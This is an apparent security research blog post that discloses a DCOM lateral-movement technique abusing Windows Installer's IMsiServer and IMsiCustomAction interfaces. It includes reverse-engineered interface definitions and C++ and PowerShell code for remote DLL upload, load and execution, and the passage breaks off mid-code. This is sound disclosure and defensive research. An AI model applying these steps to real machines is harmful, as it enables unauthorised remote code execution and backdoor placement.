# https://www.deepinstinct.com/blog/forget-psexec-dcom-upload-execute-backdoor

## DIANNA, the DSX Companion, provides real-time explainability of the threats that matter.

[Learn More](https://www.deepinstinct.com/news/deep-instinct-releases-next-generation-ai-analyst-to-provide-instant-explainability-of-never-before-seen-threats)

[Back To Blog](https://www.deepinstinct.com/blog)![](https://www.deepinstinct.com/_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fbltc65864885392870f%2F67577170fc312a2844569a3d%2FDCOM_1200x627.jpg%3Fformat%3Djpg&w=3840&q=100)

NOVEMBER 25, 2024

# Forget PSEXEC: DCOM Upload & Execute Backdoor

Join Deep Instinct Security Researcher Eliran Nissan as he exposes a powerful new DCOM lateral movement attack that remotely writes custom payloads to create an embedded backdoor.

[![Eliran Nissan](https://www.deepinstinct.com/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fblta13ab1f9fc425c07%2F67576e36f53d9870a6375c5c%2Fdeep-145.jpg&w=128&q=75)Eliran NissanSecurity Researcher](https://www.deepinstinct.com/author/eliran-nissan)

##### Executive Summary

This blog post presents a powerful new DCOM lateral movement attack that allows the writing of custom DLLs to a target machine, loading them to a service, and executing their functionality with arbitrary parameters. This backdoor-like attack abuses the IMsiServer COM interface by reversing its internals. This process is described step-by-step in this blog. The research also includes a working POC tool to demonstrate the attack on the latest Windows builds.

##### **Terminology**

###### COM & DCOM

The Component Object Model (COM) is a Microsoft standard for creating binary software components that can interact. DCOM (Distributed COM) Remote Protocol extends the COM standard over a network using RPC by providing facilities for creating, activating, and managing objects found on a remote computer.

###### Objects, Classes & Interfaces

In COM, an object is an instance of compiled code that provides some service to the rest of the system. A COM object's functionality depends on the interfaces its COM class implements.

The compiled code is defined as a COM class, which is identified by a globally unique Class ID ( **CLSID**) that associates a class with its deployment in the file system, either DLL or EXE.

COM classes that can be remotely accessed (with DCOM) are identified with another globally unique identifier (GUID) - **AppID**.

A COM interface can be regarded as an abstract class. It specifies a contract that contains a set of methods that implementing classes must serve. All communication among COM components occurs through interfaces, and all services offered by a component are exposed through its interfaces, which can be represented with a globally unique Interface ID ( **IID**). A COM class can implement several COM interfaces, and interfaces can be inherited from other interfaces.

##### COM Interface As a C++ Class

The C++ implementation of interfaces is done with classes. A C++ class is implemented as a struct, with its first member pointing to an array of member functions the class supports. This array is called a virtual table, or vtable for short.

![fig-1-com-nterfaces-and-vtables.png](https://www.deepinstinct.com/image/blt578b7ffffc80a648/6757642df56c13400abd68af/fig-1-com-nterfaces-and-vtables.png)Figure 1: COM interfaces and vtables

##### DCOM Research History

Lateral movement through DCOM is a well-known “thing” in cybersecurity, dating back to 2017 when [Matt Nelson](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) revealed the first abuse of _MMC20.Application::ExecuteShellCommand_ to run commands on remote systems. Using the [research process](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) Matt designed, researchers found [more DCOM objects](https://www.cybereason.com/blog/dcom-lateral-movement-techniques) that expose an execution primitive on remote machines, among them:

- _ShellBrowserWindow_ **revealing** _ShellExecuteW, Navigate,_ **and** _Navigate2_


- _Excel.Application_ **revealing** _ExecuteExcel4Macro, RegisterXLL_


- _Outlook.Application_ **revealing** _CreateObject_


The same research process was even [automated](https://www.scorpiones.io/articles/lateral-movement-using-dcom-objects), and it seemed like most of the DCOM attack surface was getting mapped thanks to it – as fewer attacks were revealed over time. In this blog post, I explain how I put the research process to the test to find a new DCOM lateral movement attack.

##### The Known Method to Research DCOM

Looking for a new DCOM lateral movement method follows the following steps:

- Search AppIDs on the machine for entries that have default launch and access permissions

  - James Forshaw **’** s [OleView .NET](https://github.com/tyranid/oleviewdotnet) tool correlates this data and other useful information

- AppIDs found with the prior criteria represent DCOM objects that are remotely accessible for users with a local admin privilege


- Explore suspected objects, traditionally with PowerShell, which gives easy access to object creation, displaying interface methods & properties, and invoking them


- Repeat the prior step until a method that can run custom code has been located


Here I am applying those steps to implement the known _MMC20.Application::ExecuteShellCommand_ lateral movement attack:

- The AppID _7E0423CD-1119-0928-900C-E6D4A52A0715_, which hosts the _MMC20.Application_ class, has default permissions


![fig-2-Mmc-Default-Premissions.png](https://www.deepinstinct.com/image/blt0a779f903f3ef196/6757642df53d9889e6375c0f/fig-2-Mmc-Default-Premissions.png)Figure 2: MMC default permissions

- The AppID mentioned above maps to the CLSID _49B2791A-B1AE-4C90-9B8E-E860BA07F889_


- Exploring the object created from said CLSID in PowerShell:


```
PS C:\> $com = [Type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889")

PS C:\> $mmcApp = [System.Activator]::CreateInstance($com)

PS C:\> Get-Member -InputObject $mmcApp

TypeName: System.__ComObject#{a3afb9cc-b653-4741-86ab-f0470ec1384c}
```

|     |     |     |
| --- | --- | --- |
| **Name** | **MemberType** | **Definition** |
| Help | Method | void Help () |
| Hide | Method | void Hide () |
| Document | Property | Document Document () {get} |

- Repeating the queries on discovered properties reveals the method _ExecuteShellCommand_ which allows RCE


```
 PS C:\> Get-Member -InputObject $mmcApp.Document.ActiveView

TypeName: System.__ComObject#{6efc2da2-b38c-457e-9abb-ed2d189b8c38}
```

|     |     |     |
| --- | --- | --- |
| **Name** | **MemberType** | **Definition** |
| Back | Method | void Back () |
| Close | Method | void Close () |
| ExecuteShellCommand | Method | void ExecuteShellCommand (string, string, string, string) |

- Finally, we create a DCOM session and invoke the method we found to complete the attack.


```
<# MMCExec.ps1 #>

$com = [Type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", "TARGET.I.P.ADDR")

$mmcApp = [System.Activator]::CreateInstance($com)

$mmcApp.Document.ActiveView.ExecuteShellCommand("file.exe", "/c commandline", "c:\file\folder",$null, 0)
```

##### The Query for a New Attack

Using this recipe, I started searching for a new DCOM lateral movement attack. Here are my findings:

- AppID _000C101C-0000-0000-C000-000000000046_ has default permissions, OleView .NET reveals the following details:


- Hosted on the Windows Installer service ( _msiexec.exe_)


- Hosts a COM object named “ _Msi install server_“ with a CLSID equal to the AppID


- The object exposes an interface named _IMsiServer_, with an IID equal to the AppID


- The class and interface are implemented in _msi.dll_ (pointed from _ProxyStubClsid32_ registry key)


![fig-3-Msi-install-server.png](https://www.deepinstinct.com/image/bltec4af8b13041099d/6757642d30b280de20df2726/fig-3-Msi-install-server.png)Figure 3: Msi Install Server

![fig-4-msi-install-server-default-permissions.png](https://www.deepinstinct.com/image/blta21794dcce89faca/6757642d4af80b82bcf0be8c/fig-4-msi-install-server-default-permissions.png)Figure 4: Msi install server default permissions

- The name of the object and its location within the installer service piqued my interest, so I continued to query its methods with PowerShell:


```
PS C:\> $com = [Type]::GetTypeFromCLSID("000C101C-0000-0000-C000-000000000046")

PS C:\> $obj = [System.Activator]::CreateInstance($com)

PS C:\> Get-Member -InputObject $obj

TypeName: System.__ComObject
```

|     |     |     |
| --- | --- | --- |
| **Name** | **MemberType** | **Definition** |
| CreateObjRef | Method | System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType) |
| Equals | Method | boot Equals (System.Object obj) |
| GetHashCode | Method | int GetHashCode() |

The results describe generic .NET object methods, and the “TypeName” field does not point to the _IMsiServer_ IID. This means the PowerShell runtime failed to query information on the _IMsiServer_ object; we can't search for an attack this way.

The difference between the successful example of our MMC20.Application and our current _IMsiServer_ is the _IDispatch_ interface, which the former implements and the latter does not.

![fig-5-mmc-vs-msi.png](https://www.deepinstinct.com/image/blt231797d62efbfe45/6757642d30b280c659df272a/fig-5-mmc-vs-msi.png)Figure 5: MMC20.Application vs Msi install server

##### IDispatch

_IDispatch_ is a fundamental COM interface, that allows scripting languages (VB, PowerShell) and higher-level languages (.NET) to interact with COM objects that implement it without prior knowledge. It achieves this by exposing unified methods that describe and interact with the implementing object. Among those methods are:

- _IDispatch::GetIDsOfNames_ maps names of methods or properties to an integer value named DISPID.


- _IDispatch::Invoke_ calls one of the object's methods according to a DISPID.


All of the known DCOM lateral movement attacks are built on documented IDispatch-based interfaces, allowing easy interaction through PowerShell. The ease of interacting with IDispatch interfaces blinded the security community to a large portion of possible attacks.

To solve this issue and further our research with _IMsiServer_, which lacks documentation and does not support IDispatch, we need to design an alternative approach that does not depend on PowerShell.

##### **Reversing Interface Definitions**

To learn more about **IMsiServer**, we must inspect the DLL containing the interface definition - msi.dll:

- Using IDA and searching msi.dll for the hex bytes representing the IID of **IMsiServer**\- _1C 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46_ we find a symbol named _IID\_IMsiServer_.


![fig-6-ida-byte-search.png](https://www.deepinstinct.com/image/blt812d888f5e2d4b1a/6757642d9628e1990d1e3eae/fig-6-ida-byte-search.png)Figure 6: IDA byte search

![fig-7-the-result-symbol.png](https://www.deepinstinct.com/image/bltb7450a33a9bb4908/6757642d2c929d7140b24355/fig-7-the-result-symbol.png)Figure 7: The result symbol

- Cross referencing _IID\_IMsiServer_, we find _CMsiServerProxy::QueryInterface_, which is a part of the client’s implementation for the _IMsiServer_ interface.


- Cross referencing _CMsiServerProxy::QueryInterface_ reveals the interface’s vtable in the .rdata section:


![fig-8-CMsiServerProxy-vftable.png](https://www.deepinstinct.com/image/blt4a55c22517ab0233/6757642e1cd21ee1dac22f27/fig-8-CMsiServerProxy-vftable.png)Figure 8: CMsiServerProxy::\`vftable'

With this data and some extra [definitions,](https://github.com/tongzx/nt5src) I recreated the IMsiServer Interface:

```
struct IMsiServer : IUnknown

{

    virtual iesEnum InstallFinalize( iesEnum iesState,  void* riMessage,  boolean fUserChangedDuringInstall) = 0;

    virtual IMsiRecord* SetLastUsedSource( const ICHAR* szProductCode,  const wchar_t* szPath, boolean fAddToList,  boolean fPatch) = 0;

    virtual boolean Reboot() = 0;

    virtual int DoInstall( ireEnum ireProductCode,  const ICHAR* szProduct,  const ICHAR* szAction,const ICHAR* szCommandLine,  const ICHAR* szLogFile,int iLogMode,  boolean fFlushEachLine,  IMsiMessage* riMessage,  iioEnum iioOptions , ULONG, HWND__*, IMsiRecord& ) = 0;

    virtual HRESULT IsServiceInstalling() = 0;

    virtual IMsiRecord* RegisterUser( const ICHAR* szProductCode,  const ICHAR* szUserName,const ICHAR* szCompany,  const ICHAR* szProductID) = 0;

    virtual IMsiRecord* RemoveRunOnceEntry( const ICHAR* szEntry) = 0;

    virtual boolean CleanupTempPackages( IMsiMessage& riMessage, bool flag) = 0;

    virtual HRESULT SourceListClearByType(const ICHAR* szProductCode, const ICHAR*, isrcEnum isrcType) = 0;

    virtual HRESULT SourceListAddSource( const ICHAR* szProductCode,  const ICHAR* szUserName,  isrcEnum isrcType,const ICHAR* szSource) = 0 ;

    virtual HRESULT SourceListClearLastUsed( const ICHAR* szProductCode,  const ICHAR* szUserName) = 0;

    virtual HRESULT RegisterCustomActionServer( icacCustomActionContext* picacContext,  const unsigned char* rgchCookie,  const int cbCookie, IMsiCustomAction* piCustomAction,  unsigned long* dwProcessId,  IMsiRemoteAPI** piRemoteAPI,  DWORD* dwPrivileges) = 0;

    virtual HRESULT CreateCustomActionServer( const icacCustomActionContext icacContext,  const unsigned long dwProcessId,  IMsiRemoteAPI* piRemoteAPI,const WCHAR* pvEnvironment,  DWORD cchEnvironment,  DWORD dwPrivileges,  char* rgchCookie,  int* cbCookie,  IMsiCustomAction** piCustomAction,  unsigned long* dwServerProcessId,DWORD64 unused1, DWORD64 unused2) = 0;

 [snip]

}
```

##### Remote Installations?

The _DoInstall_ function immediately stands out as a promising candidate to perform lateral movement – installing an MSI on a remote machine. However, an inspection of its server-side implementation at _CMsiConfigurationManager::DoInstall_ shows it isn’t possible remotely:

```
// Simplified pseudo code

CMsiConfigurationManager::DoInstall([snip])

{

 [snip]

  if (!OpenMutexW(SYNCHRONIZE, 0, L"Global\\_MSIExecute"))

   return ERROR_INSTALL_FAILURE;

 [snip]

}
```

This code means when invoking a DCOM call for _IMsiServer::DoInstall_, the remote server will check the existence of a mutex named _Global\\\\_MSIExecute_. This mutex is not open by default, thus the call will fail.

Msi.dll creates this mutex from functions inaccessible to our _IMsiServer_ interface, so we must find a different function to abuse _IMsiServer_.

##### Remote Custom Actions

My second candidate for abuse is:

```
HRESULT IMsiServer::CreateCustomActionServer(

    const icacCustomActionContext icacContext,

    const unsigned long dwProcessId,

    IMsiRemoteAPI* piRemoteAPI,

    const WCHAR* pvEnvironment,

    DWORD cchEnvironment,

    DWORD dwPrivileges,

    char* rgchCookie,

    int* cbCookie,

    IMsiCustomAction** piCustomAction,

    unsigned long* dwServerProcessId,

    bool unkFalse);
```

It creates the output COM object- _IMsiCustomAction\*\* piCustomAction_, which, according to its name, can invoke a “custom action” on my remote target.

Reversing the server-side code in _CMsiConfigurationManager::CreateCustomActionServer_ we learn it impersonates the DCOM client and creates a child _MSIEXEC.exe_ with its identity, which hosts the result _IMsiCustomAction\*\* piCustomAction_

Searching _msi.dll_ for symbols on _IMsiCustomAction_ reveals its IID:

![fig-9-IDA-symbols-for-IID_IMsiCustomAction.png](https://www.deepinstinct.com/image/bltccc8628fb7cadce5/6757642eaf051b3fc013b44e/fig-9-IDA-symbols-for-IID_IMsiCustomAction.png)Figure 9: IDA symbols for IID\_IMsiCustomAction

Using the symbol to perform the same cross-reference we did to discover _IMsiServer_, we can recreate _IMsiCustomAction_’s interface definition:

```
IID IID_IMsiCustomAction = { 0x000c1025,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };

// Interface is trimmed for simplicty

struct IMsiCustomAction : IUnknown

{

    virtual HRESULT PrepareDLLCustomAction(ushort const *,ushort const *,ushort const *,ulong,uchar,uchar,_GUID const *,_GUID const *,ulong *)=0;

    virtual HRESULT RunDLLCustomAction(ulong,ulong *) = 0;

    virtual HRESULT FinishDLLCustomAction(ulong) = 0;

    virtual HRESULT RunScriptAction(int,IDispatch *,ushort const *,ushort const *,ushort,int *,int *,char * *) = 0;

    [snip]

    virtual HRESULT URTAddAssemblyInstallComponent(ushort const*,ushort const*, ushort const*) = 0;

    virtual HRESULT URTIsAssemblyInstalled(ushort const*, ushort const*, int*, int*, char**) = 0;

    virtual HRESULT URTProvideGlobalAssembly(ushort const*, ulong, ulong*) = 0;

    virtual HRESULT URTCommitAssemblies(ushort const*, int*, char**) = 0;

    virtual HRESULT URTUninstallAssembly(ushort const*, ushort const*, int*, char**) = 0;

    virtual HRESULT URTGetAssemblyCacheItem(ushort const*, ushort const*, ulong, int*, char**) = 0;

    virtual HRESULT URTCreateAssemblyFileStream(ushort const*, int) = 0;

    virtual HRESULT URTWriteAssemblyBits(char *,ulong,ulong *) = 0;

    virtual HRESULT URTCommitAssemblyStream() = 0;

    [snip]

    virtual HRESULT LoadEmbeddedDLL(ushort const*, uchar) = 0;

    virtual HRESULT CallInitDLL(ulong,ushort const *,ulong *,ulong *) = 0;

    virtual HRESULT CallMessageDLL(UINT, ulong, ulong*) = 0;

    virtual HRESULT CallShutdownDLL(ulong*) = 0;

    virtual HRESULT UnloadEmbeddedDLL() = 0;

    [snip]

};
```

With names like _RunScriptAction_ and _RunDLLCustomAction_ it seems like _IMsiCustomAction_ might be our treasure trove. But, before we open it, we have to first create it with a DCOM call to _IMsiServer::CreateCustomActionServer_. Let's build our attack client:

```
// Code stripped from remote connection and ole setupCOSERVERINFO coserverinfo = {};

coserverinfo.pwszName = REMOTE_ADDRESS;

coserverinfo.pAuthInfo = pAuthInfo_FOR_REMOTE_ADDRESS;

CLSID CLSID_MsiServer = { 0x000c101c,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };

IID IID_IMsiServer = CLSID_MsiServer;

MULTI_QI qi ={};

qi.pIID = &IID_IMsiServer; // the interface we aim to get

HRESULT hr = CoCreateInstanceEx(CLSID_MsiServer, NULL, CLSCTX_REMOTE_SERVER, &coserverinfo, 1, &qi) ;

IMsiServer* pIMsiServerObj = qi.pItf;
```

At this point _pIMsiServerObj_ points to our client _IMsiServer_ interface. Now we need to create the correct arguments for _IMsiServer::CreateCustomActionServer_

Notable arguments:

1. _dwProcessId_ is expected to contain the client PID and is treated as a local PID on the server side. If we provide our true client PID, the server side will fail to find it on the remote target and the call will fail. We can trick this check and set _dwProcessId_ =4, pointing to the always-existing _System_ process

2. _PiRemoteAPI_, which should point to an _IMsiRemoteAPI_ instance, is the trickiest to initialize. Searching through symbols from msi.dll gives us the IID of that interface


![fig-10-IDA- symbols-for- IID_IMsiRemoteAPI.png](https://www.deepinstinct.com/image/bltdfc41e799b93eb16/6757642e9628e10d351e3eb2/fig-10-IDA-_symbols-for-_IID_IMsiRemoteAPI.png)Figure 10: IDA symbols for IID\_IMsiRemoteAPI

```
IID IID_IMsiRemoteApi = { 0x000c1033,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };
```

However, because _CLSID\_MSISERVER_ does not implement _IID\_IMsiRemoteApi_, we can't directly create it with a call to:

```
HRESULT hr = CoCreateInstance(CLSID_MSISERVER, NULL, CLSCTX_INPROC_SERVER, IID_IMsiRemoteApi ,&piRemoteAPI) ;
```

##### Discovering An Implementing CLSID

Heads up: this section covers a technical reverse-engineering process. We will demonstrate how to correctly invoke _IMsiServer::CreateCustomActionServer_. If you're not interested in the detailed drill-down, feel free to skip to “ **The Secured Actions.**”

To create an instance of _IMsiRemoteApi_ we need to find the _CLSID_ of the class that implements it. We’ll start by searching for a symbol named _CLSID\_MsiRemoteApi_ in msi.dll. However, this time no results are returned:

![fig-11-no-results-CLSID_MsiRemoteApi.png](https://www.deepinstinct.com/image/bltd1837a9d41309111/6757643f4657c8dce3d1c9d7/fig-11-no-results-CLSID_MsiRemoteApi.png)Figure 11: No results searching CLSID\_MsiRemoteApi

We are left trying to trace where _IID\_IMsiRemoteApi_ is created within msi.dll, using cross-references:

- Cross-referencing _IID\_IMsiRemoteApi,_ we find _CMsiRemoteAPI::QueryInterface_, which is part of the _IMsiRemoteApi_ interface


- Searching _CMsiRemoteAPI::QueryInterface_ leads to _IMsiRemoteApi_’s vtable in the .rdata section, which is marked with a symbol named _??\_7CMsiRemoteAPI@@6B@:_


![fig-12-CMsiRemoteApiVtable.png](https://www.deepinstinct.com/image/bltdd54d3bfb99771d1/6757643f4e76752949eee8f0/fig-12-CMsiRemoteApiVtable.png)Figure 12: CMsiRemoteAPI::\`vftable'

- Searching _??\_7CMsiRemoteAPI@@6B@_ leads to _CMsiRemoteAPI::CMsiRemoteAPI,_ which is the constructor for _IMsiRemoteApi_ instances


- Searching the constructor leads to _CreateMsiRemoteAPI_, a factory method that invokes it


- Searching the factory method shows it’s the **9th** element in an array of factory methods named _rgFactory_, which are located in the .rdata section:


![fig-13-rgFactory .png](https://www.deepinstinct.com/image/blt57e5ad117bf111a8/6757643f6801016d5756a3cf/fig-13-rgFactory_.png)Figure 13: rgFactory

- Searching usages of _rgFactory_ shows it's used in _CModuleFactory::CreateInstance_:


![fig-14-CModuleFactory-CreateInstance.png](https://www.deepinstinct.com/image/bltc005f71bf62c0ea4/6757643f8a58e9e5bef0fe94/fig-14-CModuleFactory-CreateInstance.png)Figure 14: CModuleFactory::CreateInstance’s reversed pseudo code

We can see that _CModuleFactory::CreateInstance_ pulls a method from _rgFactory_ at an index and invokes it to create an object and return it with _outObject_.

This will happen if, at the same _index_, a GUID pulled from _rgCLSID_ (green line in the snippet) is equal to the input argument _\_GUID \*inCLSID_.

_rgCLSID_ is a global variable that points to a CLSID array in the .rdata section

![fig-15-rgCLSID.png](https://www.deepinstinct.com/image/blt4167fb3b592b48ef/6757643ffc312adb815699f7/fig-15-rgCLSID.png)Figure 15: rgCLSID snipped

The 9th element in this array, which will cause invocation of _CreateMsiRemoteAPI_ (the 9th member of _rgFactory_), is the CLSID:

```
CLSID CLSID_MsiRemoteApi = { 0x000c1035,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };
```

This means that if _CModuleFactory::CreateInstance_ is invoked with a _CLSID\_MsiRemoteApi_, it will create our desired instance of _IMsiRemoteAPI\* piRemoteAPI_.

We are now left with a task to invoke _CModuleFactory::CreateInstance_ from our client code.

##### IClassFactory

While _CModuleFactory::CreateInstance_ is not a public export, cross-referencing it leads to _CModuleFactory_'s vtable:

![fig-16-CModuleFactory-Vtable.png](https://www.deepinstinct.com/image/blt2c4d80b68237fe56/6757643f68010125b656a3d3/fig-16-CModuleFactory-Vtable.png)Figure 16: CModuleFactory's vtable

The first method in the vtable is a _QueryInterface_ implementation, which means _CModuleFactory_ is an interface implementation. The next two Nullsubs are empty implementations of _IUnkown::AddRef_ & _IUnkown::Release_, and the next two methods are:

- _CreateInstance_ (which we reversed)


- _LockServer_


Searching those methods in [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory) reveals _IClassFactory_, an interface that defines a factory design pattern for COM object creation in implementing DLLs. The functionality of this interface is accessed through a method called _DllGetClassObject_, which is exported by the implementing DLLs, including _msi.dll._

This is how we invoke _msi.dll!DllGetClassObject_ to create our target _IMsiRemoteAPI\* piRemoteAPI_:

```
// code stripped from error handling

typedef HRESULT(*DllGetClassObjectFunc)(

    REFCLSID rclsid,

    REFIID   riid,

    LPVOID* ppv

);

// we dont need the definition of IMsiRemoteApi if we just want to instantiate it

typedef IUnknown IMsiRemoteApi;

HMODULE hmsi = LoadLibraryA("msi.dll");

IClassFactory* pfact;

IUnknown* punkRemoteApi;

IMsiRemoteApi* piRemoteAPI;

DllGetClassObjectFunc DllGetClassObject = (DllGetClassObjectFunc)GetProcAddress(hdll, "DllGetClassObject");

// creating the CLSID_MsiRemoteApi class

HRESULT hr = DllGetClassObject(CLSID_MsiRemoteApi, IID_IClassFactory, (PVOID*)&pfact);

// piRemoteAPI initilized to IMsiRemoteApi*

hr = pfact->CreateInstance(NULL, CLSID_MsiRemoteApi, (PVOID*)&punkMsiRemoteApi);

hr = punkMsiRemoteApi->QueryInterface(IID_IMsiRemoteApi, reinterpret_cast<void**>(piRemoteAPI));
```

We can now invoke _IMsiServer::CreateCustomActionServer_ to create the target _IMsiCustomAction\*\* piCustomAction_ instance:

```
IMsiRemoteAPI* pRemApi = // created above;

const int cookieSize = 16; // a constant size CreateCustomActionServer anticipates

icacCustomActionContext icacContext = icac64Impersonated; // an enum value

const unsigned long fakeRemoteClientPid = 4;

unsigned long outServerPid = 0;

IMsiCustomAction* pMsiAction = nullptr; // CreateCustomActionServer's output

int iRemoteAPICookieSize = cookieSize;

char rgchCookie[cookieSize];

WCHAR* pvEnvironment = GetEnvironmentStringsW();

DWORD cEnv = GetEnvironmentSizeW(pvEnvironment);

HRESULT msiresult =  pIMsiServerObj->CreateCustomActionServer(icacContext, fakeRemoteClientPid, pRemApi, pvEnvironment, cEnv, 0, rgchCookie, &iRemoteAPICookieSize, &pMsiAction,&outServerPid,0, 0);
```

##### The Secured Actions

Our newly created _IMsiCustomAction\* pMsiAction_ allows us to run “custom actions” from a remote MSIEXEC.EXE process, and now our focus is finding a method from _IMsiCustomAction_ that can execute code – giving us a new lateral movement technique.

As we have seen before, _IMsiCustomAction_ contains a couple of promising function names like _RunScriptAction_ and _RunDLLCustomAction_

Reversing these functions shows that they allow loading and running an export from a DLL of our liking or executing in-memory custom script contents (VBS or JS)! Seems too good to be true? It is.

Windows prevents this functionality from being invoked in a remote DCOM context, with a simple check at the start of these functions:

```
if(RPCRT4::I_RpcBindingInqLocalClientPID(0, &OutLocalClientPid)&&

  OutLocalClientPid != RegisteredLocalClientPid)

{

return ERROR_ACCESS_DENIED;

}
```

It turns out _I\_RpcBindingInqLocalClientPID_ fails when a client is remote (during a DCOM session), and we are blocked.

We need to look for functions where this security check does not exist.

##### **Unsecured Load Primitive**

We will now focus our search on unsecured _IMsiCustomAction_ methods by cross-referencing usages of _I\_RpcBindingInqLocalClientPID_ and exploring functions of _IMsiCustomAction_ that don’t use it.

The next function that meets this criterion is _IMsiCustomAction::LoadEmbeddedDll(wchar\_t const\* dllPath, bool debug)_;.

Reversing this function reveals:

1. _LoadEmbeddedDLL_ invokes _Loadlibrary_ on the _dllPath_ parameter and saves its handle.

2. Attempts to resolve three exports from _dllPath_ and saves their address.

1. _InitializeEmbeddedUI_

2. _ShutdownEmbeddedUI_

3. _EmbeddedUIHandler_
3. _LoadEmbeddedDLL_ will not fail on non-existing exports


Testing confirms that we have a remote load primitive on every DLL on the remote system!

```
 // Loads any DLL path into the remote MSIEXEC.exe instance hosting pMsiAction
```

```
pMsiAction->LoadEmbeddedDLL(L"C:\Windows\System32\wininet.dll",false);
```

Is this enough for lateral movement? Not on its own. Simply loading a benign pre-existing DLL from the target system’s HD does not give us control over the code the DLL runs at load time.

However, if we could remotely write a DLL to the machine and provide its path to _LoadEmbeddedDLL_ we would find a full attack.

[Some attacks](https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/) delegate responsibility after finding such a primitive and suggest separately writing a payload to the machine with SMB access. However, this type of access is very noisy, and usually blocked.

Using _IMsiCustomAction_ I aim to find a self-sufficient write primitive to the remote machine’s HD.

##### A Remote Write Primitive

A combination of function names in the _IMsiCustomAction_ interface leads me to believe a remote write primitive is possible:

- _IMsiCustomAction::URTCreateAssemblyFileStream_


- _IMsiCustomAction::URTWriteAssemblyBits_


Reversing _IMsiCustomAction::URTCreateAssemblyFileStream_ shows a couple of initializing functions must run before it.

The following sequence will allow us to create a file stream, write to it, and commit it:

1\. The below function will initialize data required for invoking the next function

```
HRESULT IMsiCustomAction::URTAddAssemblyInstallComponent(

	wchar_t const* UserDefinedGuid1,

	wchar_t const* UserDefinedGuid2,

	wchar_t const* UserDefinedName);
```

2\. The following function creates an internal instance of _IAssemblyCacheItem\*_, a documented object that manages a file stream

```
HRESULT IMsiCustomAction::URTGetAssemblyCacheItem(

	wchar_t const* UserDefinedGuid1,

	wchar_t const* UserDefinedGuid2,

	ulong zeroed,

	int* pInt,

	char** pStr);
```

3\.  Then _URTCreateAssemblyFileStream_ invokes _IAssemblyCacheItem::CreateStream_ and creates an instance of _IStream\*_ with the parameters provided above. The future file’s name will be _FileName_. It will save the _IStream\*_ to an internal variable.

```
HRESULT IMsiCustomAction::URTCreateAssemblyFileStream(
	wchar_t const* FileName,

	int Format);
```

4\. The function below invokes _IStream::Write_ to write the number of bytes specified in _ulong cb_ from _const char\* pv_ to the file stream and returns the number of bytes written in _pcbWritten_.

```
HRESULT IMsiCustomAction::URTWriteAssemblyBits(

	const char* pv,

	ulong cb, ulong* pcbWritten);
```

5\. Finally, the following function commits the Stream contents to a new file, using _IStream::Commit_.

```
 HRESULT IMsiCustomAction::URTCommitAssemblyStream();
```

We’ll prepare a dummy _payload.dll_, and upload it to the target machine with the prior function sequence:

```
char* outc = nullptr;

int outi = 0;

LPCWSTR mocGuid1 = L"{13333337-1337-1337-1337-133333333337}";

LPCWSTR mocGuid2 = L"{13333338-1338-1338-1338-133333333338}";

LPCWSTR asmName = L"payload.dll";

LPCWSTR assmblyPath = L"c:\local\path\to\your\payload.dll";

hr = pMsiAction->URTAddAssemblyInstallComponent(mocGuid1, mocGuid2, asmName);

hr = pMsiAction->URTGetAssemblyCacheItem(mocGuid1, mocGuid2, 0,&outi ,&outc);

hr = pMsiAction->URTCreateAssemblyFileStream(assmblyPath, STREAM_FORMAT_COMPLIB_MANIFEST);

HANDLE hAsm = CreateFileW(assmblyPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

DWORD asmSize, sizeRead;

GetFileSize(hAsm, NULL);

char* content = new char[asmSize];

readStatus = ReadEntireFile(hAsm, asmSize, &sizeRead, content);

ulong written = 0;

hr = pMsiAction->URTWriteAssemblyBits(content, asmSize, &written);

hr = pMsiAction->URTCommitAssemblyStream();
```

The entire sequence succeeds; however, we get no indication of where _payload.dll_ was written.

Searching the remote machine for a file named _payload.dll_ reveals its path:

![fig-17-Searching-the-payload .png](https://www.deepinstinct.com/image/bltd48b71e0134473d1/6757643f117e7eb6844693a4/fig-17-Searching-the-payload_.png)Figure 17: Searching the payload.dll file on the target

Re-running our code generates _payload.dll_ in a similar path:

![fig-18-Searching-the-payload2.png](https://www.deepinstinct.com/image/bltd7722206d15d00f1/6757643fa3d521f0b651c30c/fig-18-Searching-the-payload2.png)Figure 18: Searching payload.dll after a re-run

The format of those paths is _C:\\assembly\\tmp\\\[RANDOM\_8\_LETTERS\]\\payload.dll_. Since _RANDOM\_8\_LETTERS_ cannot be predicted we can't just follow up with a call to our load primitive _IMsiCustomAction::LoadEmbeddedDll_ on the said path.

We need to find a way to put our _payload.dll_ in a predictable path, and _IMsiCustomAction_ hooks us up yet again

##### Controlling The Path

The next method we reverse is _IMsiCustomAction::URTCommitAssemblies_ and we find out it uses the documented function _IAssemblyCacheItem::Commit_ on the stream:

This function installs a .NET assembly to the Global Assembly Cache (GAC), under a predictable path within _C:\\Windows\\Microsoft.NET\\assembly\\GAC\*_. This makes using _IMsiCustomAction::URTCommitAssemblies_ our new goal.

Assemblies stored in the GAC must be identified with a strong name – a signature created with a public-private key pair that ensures the uniqueness of the assembly.

Considering this, with our goal to successfully use _URTCommitAssemblies_ and plant our payload in a predictable path, we will change payload.dll to a .NET assembly DLL with a strong name:

```
// example x64 dummy POC for .NET payload.dll

// a strong name should be set for the dll in the VS compilation settings

namespace payload

{

    public class Class1

    {

        public static void DummyNotDLLMain()

        {

        }

    }

}
```

We update our code to use _IMsiCustomAction::URTCommitAssemblies_ on the new payload and re-run it:

```
HRESULT URTCommitAssemblies(wchar_t const* UserDefinedGuid1, int* pInt, char** pStr);

int outIntCommit = 0;

char* outCharCommit = nullptr;

